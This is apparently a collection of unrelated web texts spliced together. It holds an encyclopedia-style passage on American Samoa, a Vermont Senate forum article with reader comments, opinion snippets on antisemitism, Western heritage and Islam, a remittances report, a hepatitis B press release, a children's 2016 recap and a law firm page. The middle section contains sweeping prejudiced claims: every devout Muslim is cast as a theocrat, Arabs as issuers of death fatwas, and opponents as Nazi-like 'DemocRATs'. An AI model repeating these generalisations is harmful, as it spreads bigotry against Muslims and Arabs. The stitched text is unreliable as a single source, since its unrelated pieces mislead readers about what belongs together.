American Samoa is administratively divided into three districts—Eastern District, Western District, and Manu'a District—and two "unorganized" atolls, Swains Island and the uninhabited Rose Atoll. The districts and unorganized atolls are subdivided into 74 villages. Pago Pago—the capital of American Samoa[5]—is one of the largest villages and is located on the eastern side of Tutuila island in Ma'oputasi County. Fagatogo is listed in the Constitution of American Samoa as the official seat of government, but it is not the capital.[67][68][69]
Geography
Map of American Samoa
American Samoa, located within the geographical region of Oceania, is one of only two possessions of the United States in the Southern Hemisphere, the other being Jarvis Island. Its total land area is 76.1 square miles (197.1 km2) – slightly larger than Washington, D.C. – consisting of five rugged, volcanic islands and two coral atolls.[70] The five volcanic islands are Tutuila, Aunu'u, Ofu, Olosega, and Ta‘ū. The coral atolls are Swains and Rose Atoll. Of the seven islands, Rose Atoll is the only uninhabited one; it is a Marine National Monument.

Coastline of American Samoa
Due to its positioning in the South Pacific Ocean, it is frequently hit by tropical cyclones between November and April. Rose Atoll is the easternmost point of the territory. American Samoa's Rose Atoll is the southernmost point of the United States.[71] American Samoa is home to the National Park of American Samoa.
Vailulu'u Seamount
The Vailulu'u Seamount, an active submerged volcano, lies 28 miles (45 km) east of Ta‘ū in American Samoa. It was discovered in 1975 and has since been studied by an international team of scientists, contributing towards understanding of the Earth's fundamental processes.[72] Growing inside the summit crater of Va'ilulu'u is an active underwater volcanic cone, named after Samoa's goddess of war, Nafanua.
Climate
American Samoa has a tropical climate all year round with two distinct seasons, the wet and dry season. The wet season is usually between December and March and the dry season from April through to September with the average daily temperature around 81–83 °F (27–28 °C) all year round.
Economy
Main article: Economy of American Samoa
Employment on the island falls into three relatively equal-sized categories of approximately 5,000 workers each: the public sector, the single remaining tuna cannery, and the rest of the private sector.
There are only a few federal employees in American Samoa and a few active duty military personnel, except members of the U.S. Coast Guard, military recruiters, and some Full Time Support staff at the Pele Army Reserve unit that maintains the facility and provides cadre, training, and logistics support. The Pele US Army Reserve Center, is in Tafuna, Western District,[73] and a U.S. Army and United States Marine Corps recruiting station is in Nu'uuli, American Samoa.
There are six Army Reserve units at Pele:[74]
Bravo Company, 100th Battalion, 442 Infantry;
Charlie Company, 100th Battalion, 442nd Infantry;
411th Forward Support Company (Engineer);
USAR Theater Support Group Detachment American Samoa;
1st Evacuation/Mortuary Platoon, 2nd Platoon, 962nd Quartermaster Company; and
127th Chaplain Detachment.
The overwhelming majority of public sector employees work for the American Samoa territorial government. The one tuna cannery is StarKist, which exports several hundred million dollars worth of canned tuna to the United States each year. The other tuna cannery was Samoa Packing, a Chicken of the Sea subsidiary, but it closed in 2009 due to American Samoans being granted minimum wage.[75] In early 2007, the Samoan economy was highlighted in the Congress at the request of Eni Faleomavaega, the Samoan delegate to the United States House of Representatives, as it was not mentioned in the minimum wage bill.[clarification needed]
From 2002 to 2007, real GDP of American Samoa increased at an average annual rate of 0.4 percent. The annual growth rates of real GDP ranged from −2.9 percent to +2.1 percent. The volatility in the growth rates of real GDP was primarily accounted for by changes in the exports of canned tuna. The tuna canning industry was the largest private employer in American Samoa during this period.

From 2002 to 2007, the population of American Samoa increased at an average annual rate of 2.3 percent, and real GDP per capita decreased at an average annual rate of 1.9 percent.
The Fair Labor Standards Act of 1938 has contained special provisions for American Samoa since its inception, citing its limited economy.[76] American Samoan wages are based on the recommendations of a Special Industry Committee meeting bi-annually.[77] Originally, the act contained provisions for other territories, provisions which were phased out as those territories developed more diverse economies.[78]
In 2007, the Fair Minimum Wage Act of 2007 was passed, increasing minimum wage in American Samoa by 50¢ per hour in 2007 and another 50¢ per hour each year thereafter until the minimum wage in American Samoa equals the federal minimum wage of $7.25 per hour in the United States.[79] In response to the minimum wage increase, the Chicken of the Sea tuna canning plant was shut down in 2009 and 2,041 employees were laid off in the process.[80] The other major tuna canning plant in American Samoa is StarKist, which began laying off workers in August 2010, with plans to lay off a total of 800 workers due to the minimum wage increases and other rising operation costs.[81] American Samoa Governor Togiola Tulafono suggested that, rather than laying off minimum wage workers, the companies could reduce salaries and bonuses of top-tier employees.[82]
The unemployment rate was 29.8% in 2005, but has been improved to 23.8% as of 2010[update]. Samoa GDP is $537 million and its GDP per capita (PPP) is $8,000 as of 2007[update].
Some aspects of telecommunications in American Samoa are, like other U.S. territories, inferior to that of the mainland United States; a recent estimate showed that American Samoa's Internet speed is slower than that of several Eastern European countries.[83]
Taxation
American Samoa is an independent customs territory. As such, local residents are not subject to U.S. federal income taxes on Samoan source income, nor are they subject to pay any real estate taxes on owned properties.[84]
Transportation
The current territorial license plate design, introduced in 2011

American Samoa has 241 km of highways (estimated in 2008).[5] The maximum speed limit is 30 miles per hour. Ports and harbors include Aunu‘u, Auasi, Faleāsao, Ofu and Pago Pago.[5] American Samoa has no railways.[5] The territory has three airports, all of which have paved runways. The main airport is Pago Pago International Airport,[5] on the island of Tutuila. The Manu'a group has two airports: Ofu Airport on the island of Ofu, and Fitiuta Airport on the island of Ta'u. According to a 1999 estimate, the territory has no merchant marine.[5]
Demographics
Main article: Demographics of American Samoa
The current population of American Samoa is about 55,689 people,[1][6][7][2] 98% of whom live on the largest island, Tutuila.[49][85] Most of them all "nationals but not citizens of the United States at birth,"[8][7][6] while 7–15% are U.S. citizens and about 35% are foreigners.[86] Of the foreign-born population, 81% are from Samoa.[86]
American Samoa is small enough to have just one ZIP code, 96799, and uses the US Postal Service (state code "AS") for mail delivery.[87][88]
Ethnicity and language
Of the population, 91.6 percent are native Samoans, 2.8% are Asian, 1% is white, 4.2% are mixed, and 0.3% are of other origin. Most people are bilingual. Samoan, a language closely related to Hawaiian and other Polynesian languages, is spoken natively by 91% of the people as well as the co-official language of the territory, while 80% speak English, 2.4% speak Tongan, 2% speak Japanese and other Asian languages, and 2% speak other Pacific islander languages.[5] At least some of the deaf population use Samoan Sign Language. Tokelauan is also spoken in Swains Island.
Religion
One of many churches in Samoa
Major Christian denominations on the island include the Congregational Christian Church in American Samoa, the Roman Catholic Church, the Church of Jesus Christ of Latter-day Saints and the Methodist Church of Samoa. Collectively, these churches account for the vast majority of the population.
J. Gordon Elton in his book claims that the Methodists, Congregationalists with the London Missionary Society, and Roman Catholics led the first Christian missions to the islands. Other denominations arrived later, beginning in 1895 with the Seventh-day Adventists, various Pentecostals (including the Assemblies of God), Church of the Nazarene, Jehovah's Witnesses and Latter-Day Saints.
CIA Factbook 2010 estimate shows the religious affiliations of American Samoa as 98.3% Christian, other 1%, unaffiliated 0.7%.[5] World Christian Database 2010 estimate shows the religious affiliations of American Samoa as 98.3% Christian, 0.7% agnostic, 0.4% Chinese Universalist, 0.3% Buddhist and 0.3% Bahá'í.[89]
According to Pew Research Center, 98.3% of the total population is Christian. Among Christians, 59.5% are Protestant, 19.7% are Roman Catholic and 19.2% are other Christians. A major Protestant church on the island, gathering a substantial part of the local Protestant population, is the Congregational Christian Church in American Samoa, a Reformed denomination in the Congregationalist tradition. As of August 2017[update], The Church of Jesus Christ of Latter-day Saints website claims membership of 16,180 or one-quarter of the whole population, with 41 congregations, and 4 family history centers in American Samoa.[90] Jehovah's Witnesses claim 210 "ministers of the word" and 3 congregations.[91]
Education
The island contains 23 primary schools and 10 secondary schools, 5 are operated by the American Samoa Department of Education,[92] and the other 5 are administered by either religious denominations or are privately owned. American Samoa Community College, founded in 1970, provides post-secondary education on the islands.
Culture
See also: Culture of Samoa
The ethnic culture of American Samoa is almost the same as the ethnic culture of Western Samoa (Upolu and Savaii). Aside from the territory's relationship with America and consequent cultural influence, there is little that differentiates it from the sovereign nation of Samoa.
Sports
See also: Sports in American Samoa
The main sports played in American Samoa are Samoan cricket, baseball, basketball, soccer, and American football. Rugby is also played and, in Samoan villages, volleyball is popular.
American football
About 30 ethnic Samoans, all from American Samoa, currently play in the National Football League, and more than 200 play NCAA Division I college football.[93] In recent years, it has been estimated that a Samoan male (either an American Samoan, or a Samoan living in the mainland United States) is anywhere from 40[94] to 56 times[93] more likely to play in the NFL than a non-Samoan American, giving American Samoa the nickname "Football Islands".[46] Six-time All-Pro Junior Seau was one of the most famous Americans of Samoan heritage ever to play in the NFL, having been elected to the NFL 1990s All-Decade Team and Pro Football Hall of Fame. Pittsburgh Steelers safety Troy Polamalu, though born and raised in the mainland United States, is another famous American of Samoan heritage to have played in the NFL, not having his hair cut since 2000 (and only because a USC coach told him he had to) and wearing it down during games in honor of his heritage. The football culture was featured on 60 Minutes on January 17, 2010.
American Samoa's delegation to the 2016 Republican National Convention boasted about being "the greatest exporter of NFL players".[95]
Association football
The American Samoa national association football team is one of the newest teams in the world, and is also noted for being the world's weakest. They lost to Australia 31–0 in a FIFA World Cup qualifying match on April 11, 2001, but on November 22, 2011 they finally won their first ever game, beating Tonga 2–1 in a FIFA World Cup qualifier.[96] The appearance of American Samoa's Jaiyah Saelua in the contest "apparently became the first transgender player to compete on a World Cup stage".[97]
Boxing
Maselino Masoe, who represented American Samoa in three consecutive Olympics from 1988 to 1996, was WBA middleweight champion from 2004 to 2006.
Professional wrestling
A number of American Samoan athletes have been very visible in professional wrestling. The Anoa'i family in particular has had many of its members employed by WWE.
Rugby league
The American Samoa national rugby league team represents the country in international rugby league. The team competed in the 1988, 1992, 1998 and 2004 Pacific Cup competitions. The team has also competed in the 2003 and 2004 World Sevens qualifiers in the 2005 World Sevens. America Samoa's first match in international Rugby League was in 1988 pacific cup against Tonga, Tonga won the match 38–14 which is still the biggest loss by an American Samoan side. American Samoa's biggest win was in 2004 against New Caledonia with the score ending at 62–6.
American Samoa gets broadcasts of the National Rugby League in Australia on free-to-air television.[98]
There is also a new movement which aims to set up a four-team domestic competition in American Samoa.[98]
Rugby union

Rugby union is a growing sport in American Samoa. The first rugby game recorded in American Samoa was in 1924, since then the development of the game had been heavily overshadowed by the influence of American Football during the 1970s. The highest governing body of rugby in American Samoa is the American Samoa Rugby Union which was founded in 1990 and was not affiliated into the IRB until 2012. Internationally, two American Samoans have played for the New Zealand national rugby union team, known as the All Blacks. Frank Solomon (born in Pago Pago) became the first American national of Samoan descent to play for a New Zealand team. Considered a pacific pioneer in New Zealand rugby,[citation needed] Solomon scored a try against Australia in the inaugural Bledisloe Cup match in 1932, which New Zealand won 21–13.
The second American Samoan to play for the All Blacks is Jerome Kaino (born in Faga'alu). A native of Leone, Kaino moved to New Zealand when he was 4 years old. In 2004, at age 21, he played his first match for New Zealand against the Barbarians where he scored his first try, contributing to New Zealand's 47–19 victory that resulted in him becoming man of the match. He also played a crucial role in the Rugby World Cup 2011 playing every match in the tournament. He scored four tries in the event which led to New Zealand winning the final against France 8–7. Kaino was also a key member of the 2015 Rugby World Cup squad, where he played every match including a try he scored in the quarterfinals against France which New Zealand won 62–13. He scored again in the semifinals against South Africa, which New Zealand won 20–18. He played in the World Cup final against Australia where New Zealand won again 34–17 to become world champions for a record 3 times (1987, 2011 and 2015). Kaino is one of twenty New Zealand rugby players to have won the Rugby World Cup twice, back to back in 2011 and 2015. In August 2015, the American Samoa Rugby Union Board selected Leota Toma Patu from the village of Leone as the coach for the Talavalu 15 men's team that represented American Samoa at the Ocean Cup 2015 in Papua New Guinea.
Sumo wrestling
Some Samoan Sumo wrestlers, most famously Musashimaru and Konishiki, have reached the highest ranks of ōzeki and yokozuna.
Track and field
Hammer thrower Lisa Misipeka attracted international attention by winning a bronze medal in the 1999 World Championships in Athletics.

Faleomavaega (PDF), November 7, 2012, retrieved April 26, 2014, More than a century ago, the Supreme Court held that the Citizenship Clause of the Fourteenth Amendment does not extend birthright citizenship to United States nationals who are born in unincorporated territories. See Downes v. Bidwell, 182 US 244, 251 (1901). The Court has reaffirmed this principle through the years, noting that individuals who are born in an unincorporated territory, though "subject to the jurisdiction of the United States," are "American nationals" who are not birthright citizens of the United States.

Chittenden County Senate candidates take part in a roundtable discussion
Michael Bielawski / October 17, 2018	
BURLINGTON — Five candidates for state Senate faced-off in a forum Monday evening in the Channel 17 studios, and voters got to hear distinctly different plans for Vermont from both the left and right.
One fresh face was independent candidate Louis Meyers. He’s a doctor who says he is running for office because there are no physicians currently in the Legislature. He repeatedly stressed that the state is moving towards an “all-payer” health care model that will need guidance from people on the inside.
Another new face was Libertarian Party candidate Loyal Ploof. He laid out details of his party’s platform by calling to abolish the income tax and limit government involvement in individuals’ lives. He also spoke in favor of defending the Second Amendment.
Touting a similar message was Republican Dana Maxfield, who took a conservative approach on issues such as the economy, deregulation, Second Amendment and personal liberties.
The incumbents at the table were Democrat Michael Sirotkin and Democrat/Progressive Chris Pearson. The two spoke in favor of raising the minimum wage, requiring paid-leave for workers, passing universal health care and protecting the environment.
On the issue of health care, Pearson and Sirotkin generally favored a more centralized and socialized system, whereas Ploof and Maxfield wanted less government involvement, more choice, and fewer mandates.
“We need more options and that should bring the price down,” Ploof said. “I have a friend of mine who lives in another state, he’s got the greatest insurance, chiropractic, everything. He chose his insurance, The government didn’t say, ‘Hey, you’ve gotta have insurance and this is your insurance.'”
Meyers and Sirotkin both were critical of the powerful position that UVM Medical Center has the overall health services in the state. Sirotkin noted pay disparity between UVM and independent doctors.
“We do have to right-size the players,” he said. “I’m on the Finance Committee and one of the things we’ve learned is … there are two sets of reimbursement rates from Blue Cross Blue Shield and MVP. One is for the medical center hospital and the other is for everybody else.”
Meyers explained why all-payer model may not be a great idea. This would entail health care providers getting an annual lump-sum of money, instead of getting paid through the traditional “fee for service” approach. The hope is that doctors would be incentivized to promote preventive care and keep patients out of the hospital as much as possible. Meyers said this concept can work small scale, but not so much big scale.
“It’s going to be an all-encompassing plan that’s going to affect everyone in this state,” he said. “As the national studies are starting to come out, they are not favorable to this kind of plan. “Two studies recently in the New England Journal [of Medicine] suggests that these are at best break-even and at worst can cost a tremendous amount of money. There are other much simpler options that we could have gone to and perhaps still could.”
On gun rights, Ploof and Maxfield criticized S.55, the state’s new gun law that limits magazine capacity, expands background checks to private sales, raises the gun purchase age, and more. Meyers, Pearson, and Sirotkin were all either involved in its passage or generally supportive.
Pearson praised the portion of the law that gives increased leverage to law enforcement to act if an individual is showing aggression that might indicate a shooting is about to occur.
“Prior to that law, if you had a neighbor who was being very vocal about frustration with the school or maybe even on Front Porch Forum, saying how terrible the school was, and then you saw them loading firearms into their truck the next day through your front window, there was nothing you could do because those were legally possessed,” Pearson said. “Now you have the ability … to call law enforcement and they can intervene.”
Maxfield, who said his son has just started sixth grade, did not believe that the law does anything to make his child safer in school
“I think if we were serious about trying to protect the children as opposed to just limit firearms, which seems to be what the real motive behind S.55 was,” he said, “[I think we would ask] what can we do at the school? What can we do with education involving firearms? What can we do with mental health?”
All the candidates generally agreed that small businesses need an easier way to grow in Vermont. Sirotkin praised an effort by Pearson this last session to streamline the start-up process with the state.
“90 percent of our businesses in the state of Vermont have 20 or fewer employees,” he said. “We need to focus on helping those businesses, and Senator Pearson put a bill forward this year where we are gonna have one-stop shopping for small businesses to incorporate, to get started.”

Take a min. to read this statement by Pearson again. Senator Pearson is a very dangerous person and should not be put in a position of responsibility, particularly anywhere it affects Vermonters.
Think about this scenario; you write in a concern in Front Porch (as an example) about the local school and a “citizen” sees you the next day loading guns into you truck and it is perfectly alright and encouraged to call the “authorities” to intervene. Really? By the way Senator’s Ingram, Baruth and Ashe think very similarly. They need to be voted OUT!
How soon we forget about Nazi Germany. If you didn’t like your neighbor, or someone else you made a call to the “authorities” and in many cases your neighbor was never seen again. This is what the Progressive movement is all about. PEOPLE CONTROL. They are all smarter than we are and we need to be protected from ourselves. Sad and sick!!!
Here it is again, copied form TN article above:
Pearson praised the portion of the law that gives increased leverage to law enforcement to act if an individual is showing aggression that might indicate a shooting is about to occur.
“Prior to that law, if you had a neighbor who was being very vocal about frustration with the school or maybe even on Front Porch Forum, saying how terrible the school was, and then you saw them loading firearms into their truck the next day through your front window, there was nothing you could do because those were legally possessed,” Pearson said. “Now you have the ability … to call law enforcement and they can intervene.”
Voters are our own worst enemy as we keep voting these same miscreants into office. Remember this on November 6th.

The only good thing within this debate is that it shows ” Progressive DemocRATs ” are
the only voice we have…….shameful.
Let stir things up and send these Progressive fools packing, Vermont Deserves Better.

Great that you post these on line. I will say that it appears all the conversation is shifted to what the DNC platform is, there isn’t much of a waiver in almost every interview and questionnaire we’ve seen or received.
We find this very interesting and troubling.
Our research is that Vermonters have for some time now 3 white elephants that Montpelier continues to ignore or kick down the road.
Affordability, School Funding and Drugs.
It’s a bit too convenient and couldn’t possibly be a coincidence that EVERY source is asking the same questions. Waterbury Record is the stand out in asking us some different questions.
Our point is money, lobbyists and PACs are steering the conversations. They say you can tell a tree by it’s fruit. Thorn bushes don’t grow McIntosh Apples. We reap what we sow.
We haven’t been affordable, despite having he highest minimum wage in the nation for decades. Our school funding the same. We didn’t have a drug problem, now we lead the nation in addicted births.
We need new people in Montpelier, many people talk a very good game, being a sophisticated speaker is not necessarily a compliment or desirable character.

Disgusting…
They only dare do it against the Jews, never the Arabs, the latter gives death fatwas.
Dutch Volkskrant daily publishes extreme antisemitic cartoon against Israel
The major Dutch daily, Volkskrant has published a cartoon depicting an Israeli soldier wearing sunglasses and the Jewish Star of David on his back while a frightened, unarmed Palestinian stands against a wall.
The Israeli soldier is shown firing a barrage of bullets spelling out “happy birthday to me” on the wall behind the Palestinian with bullets going through the Palestinian. The Simon Wiesenthal Center denounced the cartoon as demonizing Israel and its soldiers as blood thirsty murderers.

Melting pot societies are the only way to secure the individual…
Multiculturalism is a gross failure. Assimilation, where celebrating one’s own heritage but as a full member of the dominant culture, wins.
There Is No Such Thing As White Cultural Heritage. The West’s Legacy Is Open To All…
There’s No Common Cultural Legacy For The Alt-Right
Still, is there something to it? Is there a common heritage that will cover El Greco and Hume and Dostoyevsky? Is there one that can include the Jacobites and the Jacobins? There is, but it is not racial, and white supremacists reject it because it rejects them. The unifying heritage of Europe is religious and philosophical. It is Jerusalem and Athens, in one famous formulation. Christian religion and Greek philosophy, filtered through Roman law and culture, are the foundation of European culture. The tensions, agreements, developments and settlements between these have shaped the Western world, and these roots of Western civilization are not congenial to white supremacy.
Christianity is universal in its message and Jewish in its origins. For centuries after its founding, Christianity’s center was the Mediterranean world, including Asia Minor and North Africa. Christianity has never been defined by race, and locally-grown racist heresies are only sustainable among those ignorant of Christianity’s teachings, origins and history.
Greek philosophy is likewise ill-suited to serve as a basis for white identity. It is either too universal (addressing the human condition in general) or too local—none of us live as citizens of an ancient Greek polis. Later philosophical developments in Europe, such as the philosophies of the Enlightenment, likewise tend to be too universal for white supremacists seeking a tribal identity. As for the scientific revolution that developed within Western culture (albeit with much borrowed from outside Europe), math doesn’t care what color someone is.

SECULARISM AND RELIGION: THE ONSLAUGHT AGAINST THE WEST’S MORAL CODES
War is being waged against Western culture from within which is in essence a war against Christianity and its moral origins in the Hebrew Bible. By attacking these Biblical foundations in the name of reason and human rights, the culture warriors of secularism are sawing off the branch on which they sit. The only way to defend Western civilisation is to reaffirm and restore its Biblical foundations. My argument is a development of ideas I first explored in my 2012 book The World Turned Upside Down: The Global Battle over God, Truth and Power.
We are living in an era which extols reason, science and human rights. These are said to be essential for progress, a civilised society and the betterment of humanity. Religion is said to be their antithesis, the source instead of superstitious mumbo-jumbo, oppression and backward-thinking.
Some of this hostility is being driven by the perceived threat from Islamic terrorism and the Islamisation of Western culture. However, this animus against religion has far deeper roots and can be traced back to what is considered the birthplace of Western reason, the 18th-century Enlightenment.
Actually, it goes back specifically to the French Enlightenment. In England and Scotland, the Enlightenment developed reason and political liberty within the framework of Biblical belief. In France, by contrast, anti-clericalism morphed into fundamental hostility to Christianity and to religion itself.
“Ecrasez l’infame,” said Voltaire (crush infamy) — the infamy to which he referred being not just the Church but Christianity, which he wanted to replace with the religion of reason, virtue and liberty, “drawn from the bosom of nature”.
Perfecting society
But this Enlightenment did not remove religion so much as pervert it. It took millenarian fantasies, the idea that the perfection of the world was at hand, and it secularised them. Instead of God producing heaven on earth, it would be mankind which would bring that about. Reason would create the perfect society and “progress” was the process by which utopia would be attained.

Daniel Greenfield explains Islam 101:
"Every devout Muslim is an "Islamist". Islam is not a personal religion. It is a religion of the public space. A "moderate" Muslim would have to reject Islam as a religion of the public space, as theocracy, and that secularism would be a rejection of Islam.
Nothing in Islam exists apart from anything else. While liberals view culture and religion as a buffet that they can pick and choose from, it is a single integrated system. If you accept one part, you must accept the whole. Once you accept any aspect of Islam, you must accept its legal system and once you accept that, you must accept its governance and once you accept that, you lose your rights.''

DIASPORA | Caribbean migrants sent record amount of money home in 2016

Remittances to Latin America and the Caribbean, rose to a record high in 2016, according to recently released data from the World Bank. This is despite that fact that Remittance flows worldwide fell dramatically for a second consecutive year in 2016, the first back-to-back decline in over three decades.
In Latin America and the Caribbean – which together making up a region where many people say economic conditions are bad – remittances rose to $74.3 billion, a 7.4% increase from the previous year ($69.2 billion). Globally, however, migrants sent an estimated $574 billion to their home countries in 2016, a 1.4% drop from 2015. Europe was the only other region in the world to see an increase, and it was a much smaller one (up 0.9%).
According to the Pew Research centre which analysed the World Bank data, "the total amount of money transferred is likely significantly larger than what is reported, because these estimates do not include the transfer of other assets, such as gifts, or informal monetary transfers, as the World Bank reports only remittances sent via formal channels.
"Most of the remittance dollars flowing to Latin America come from the U.S., which is home to two-thirds of all migrants from Latin America and the Caribbean. (For migrants from Mexico, El Salvador, Guatemala and Honduras, this share is far higher – more than 80% of migrants from each of these countries live in the U.S., according to 2017 United Nations estimates.) The number of immigrants from Latin America living in the U.S. continues to increase, though growth is modest and most new arrivals are from Central America and not Mexico." the research centre said.
they have chalked up the increase in remittances to the region as a consequence of " improved labor market conditions in the U.S., which has helped boost Latin American migrants’ capacity to send money home. This improvement was especially evident in sectors such as information, construction and manufacturing, industries in which many Latin American immigrants work."
In 2016, median weekly earnings of foreign-born Hispanic workers in the U.S. increased by 6.2% from the previous year. Additionally, the annual average unemployment rate of foreign-born U.S. Hispanics declined by 0.7 percentage points in 2016, to 4.7%. (Spain, another common destination country for migrants from Latin America, has also experienced increased employment and wages.)
A strong U.S. dollar, coupled with the depreciation of most currencies in Latin America, was another factor behind the increase in remittance flows to the region, according to the World Bank. In Mexico, for example, the U.S. dollar appreciated against the Mexican peso by 17.7% from 2015 to 2016, which resulted in remittances (sent in U.S. dollars) having stronger purchasing power there.
Among Latin American and Caribbean countries, Mexico has long received the highest amount of remittances. In 2016, $28.6 billion in remittances flowed to Mexico (up 9.3% from the previous year) – a total that accounted for over a third of remittances to all of Latin America and the Caribbean. After Mexico, Guatemala ($7.5 billion), the Dominican Republic ($5.5 billion) and Colombia ($4.9 billion) received the highest amounts of remittances in the Latin America and Caribbean region in 2016.
Worldwide, Mexico ranks fourth in remittances sent by migrants, behind India ($62.7 billion), China ($61.0 billion) and the Philippines ($31.1 billion). Together, these four countries accounted for almost a third of all remittances sent in 2016.
As a share of total economic output (measured in gross domestic product), remittances were equivalent to 29.4% of Haiti’s 2016 GDP, while for the Caribbean as a whole, remittances were equal to 8% of GDP – a far higher share than for Central and South America (3.6% and 0.5% respectively).
Despite the recent overall decline in remittances, the amount sent by migrants globally to their home countries in 2016 remains more than double that of 2005, when $280 billion in remittances were sent. Global remittances are expected to increase in coming years, because of anticipated growth in the U.S. and European economies (where nearly half of the world’s migrants live), and the appreciation of major currencies like the Russian ruble, according to a World Bank projection.

Hep B United Applauds CMS Final Decision to Cover Screening for Hepatitis B Infection

Hepatitis B Screening Test Added as a Preventive Service for Medicare Beneficiaries
Doylestown, Pa. – Hep B United, a national coalition co-chaired by the Hepatitis B Foundation and the Association of Asian Pacific Community Health Organizations (AAPCHO), applauds the Centers for Medicare and Medicaid Services’ (CMS) final decision to cover screening for hepatitis B infection at no cost to individuals entitled to benefits under Medicare Part A or enrolled in Medicare Part B. The CMS decision states that a screening test is covered for individuals who are determined high risk for hepatitis B as identified by a primary care provider in a primary care setting.
“This decision is a significant step forward to identify those with chronic hepatitis B across the U.S., link them to care, and prevent end-stage liver disease and liver cancer,” said Joan Block, RN, BSN, executive director and co-founder of the Hepatitis B Foundation. “While we are pleased with this decision, we must continue to ensure that all individuals at risk for hepatitis B infection have access to this critical preventive service in a broad array of settings, in addition to the primary care setting.”
Hepatitis B is a liver infection caused by the hepatitis B virus (HBV). Up to 2.2 million Americans are living with chronic hepatitis B infection and approximately 67% are unaware of their infection. Of the identified and reported cases of HBV in the U.S. between 2007 and 2012, 15.6% were over the age of 65 and part of the Medicare covered population. Left untreated, up to 25% of people with hepatitis B develop serious liver problems, including cirrhosis and liver cancer. HBV is a primary risk factor for liver cancer, the second deadliest cancer for men and women.
Hepatitis B is also associated with significant health disparities in the United States, disproportionately impacting Asian American and Pacific Islander and African immigrant communities. Asian Americans and Pacific Islanders make up 50% of the HBV infection burden in the U.S., and have liver cancer rates that are up to 13 times higher than Caucasian populations.
“We are very excited about this new preventive benefit for our Medicare population that will save lives and costs for our health care system, and we are fully committed to working with all of our health care partners in ensuring individuals at high risk for HBV infection are aware of this new service,” said Jeff Caballero, MPH, executive director of AAPCHO.
The CMS Decision Memo for Screening for Hepatitis B Virus Infection is available online at https://www.cms.gov/medicare-coverage-database/details/nca-decision-memo.aspx?NCAId=283.

2016 is a year that changed the world in many ways. Sometimes those changes were hard to hear about, like terrorist attacks in Brussels, Nice and the Middle East, and a big shooting in the US city of Orlando. Natural disasters hit the island of Haiti, Fiji and in Italy. There was also the ongoing refugee crisis, as people continued to run from war and violence in the Middle East. But in hard times, people did come together to lend help and support, even to fight for freedom.
There were stories that got the world talking, like the Olympic and Paralympic Games in Brazil where there were worries about the spread of a nasty virus carried by mozzies, Russian drug cheats and unusually green pools!
And who could forget the two big votes that divided nations and left a lot of people surprised! First, in the UK, after months of campaigning between Team Stay and Team Leave, the UK voted to exit the European Union and go it alone. Then in the US, a former reality TV star went head-to-head with a seasoned politician for the country's top job. There were arguments, scandals and many uncomfortable moments, but in the end America voted for Donald Trump to run the country and, perhaps most amazingly, it fulfilled a Simpsons prophecy!
We also celebrated some historic people like the Queen who turned 90, the splendiferous children's author Roald Dahl who would've been 100, and famous playwright William Shakespeare who died 400 years ago.
We also said goodbye to some beloved stars like boxer and activist Mohammed Ali, singers Prince and David Bowie and Alan Rickman aka Severus Snape from Harry Potter.
Then there were some moments that were just out of this world! Like when NASA's Juno spacecraft made it closer to the planet Jupiter than we've ever seen before, or when the world said goodbye to the spacecraft Rosetta when it was deliberately crashed into the comet it had been orbiting for 12 years, bringing its historic mission to an end.
But back down on earth there was also plenty to keep people entertained, like the always colourful characters competing in Eurovision; still think Dami should've won. Or the online vote to name a million-dollar research vessel. Which, of course, ended with the most popular name Boaty McBoatFace. And, finally, who could forget the craze that got thousands of people outdoors for at least two good weeks of totally obsessive gaming behaviour - PokÃ©mon Go! Ah, I never did catch that Pikachu, oh well.

The Dogma of Dianne Feinstein
By Sohrab Ahmari ● The New York Times ● 09/11/2017
SHARE ON FACEBOOK
SHARE ON TWITTER
Amy Coney Barrett, a devout Catholic and Notre Dame law professor nominated to serve on the 7th Circuit Court of Appeals, was probed by Democratic lawmakers in a way that went beyond questions of qualification to an interrogation regarding faith. The incident is emblematic of a repressive turn among Western liberals, who having won most political and cultural battles, now seek to subjugate the minds and consciences of their opposition.

Healthcare Law
The issues involved in creating a healthcare entity are dependent upon the form of entity chosen and the financing available to the business. The attorneys at Blodnick Fazio & Clark can help to analyze each healthcare entity’s individual circumstances in order to determine what financing and formation agreements are right for them. Starting off with the wrong financing, or the wrong formation, can have a serious adverse impact on the business, while additional planning and greater care taken during the formation process can help make the business more successful. Once the healthcare entity is formed and financed correctly, there are a whole host of other issues that the firm can address. Almost every day the work done by healthcare providers is scrutinized to the highest degree. There is a great potential for legal issues that may arise from patients, employees, attorneys or business partners. The attorneys at Blodnick Fazio have represented clients on both sides of healthcare law matters and understand the need for the best representation when faced with difficult health law issues. Below are some of the most common healthcare law matters that the firm has addressed for our clients.
Formation of Healthcare Practices and Other Provider Entities
Forming a healthcare practice is much different from forming any other type of business, as the business is formed with professionals in mind. The formation of a healthcare practice, whether it is to be a partnership, corporation, or any other business model, is a delicate system and upon the formation of the practice, every single issue must be addressed or discussed. The attorneys at Blodnick Fazio & Clark can help to make sure that the entity you decide to form will be the best option for your type of business. Our firm is dedicated and experienced in the area of corporate reorganizations as well as any ownership, structural or employee changes. Furthermore, our attorneys will help to ensure that your business is protected and is not violating Stark regulations as well as fraud and abuse laws. The type of entity to be chosen will depend on individual facts and circumstances and the need to limit liabilities. Our attorneys will help to make sure that your individualized business needs are addressed.
Finance Agreements
A newly formed, merged, or purchased healthcare entity will succeed or fail depending on proper business planning, financial planning, and profit margins. A skilled business financing attorney can help address current and long-term financial goals. While most businesses are financed institutionally, there are other ways of financing a business that may be better situated for certain businesses. How a healthcare entity chooses to finance their business should be based on a case-by-case analysis of needs. Additionally, business financing attorneys will help to protect individual assets of any person involved in the startup of the company and take steps to ensure that they will not be held personally liable for any debts the healthcare entity may incur.
Employment Agreements for Healthcare Providers and Entities
It is also important when forming an employee and employer relationship to make sure that all terms set forth in employment agreements are precise and unambiguous. There are many employment relationships that may be formed when entering a healthcare practice. Some of these relationships include independent contractors, employees, not to mention equipment leases, space leases, real estate transactions, recruitment agreements, professional service arrangements, relationships with physicians, hospitals, health systems, hospices, home health agencies, physical therapists, nurse practitioners, and long-term care facilities. Our attorneys can assist with the drafting of agreements that protect the interests of the healthcare practice while complying with applicable federal, state, and local laws and regulations.
Credentialing and Audit Issues with Medicare, Medicaid. and Various Health Insurers
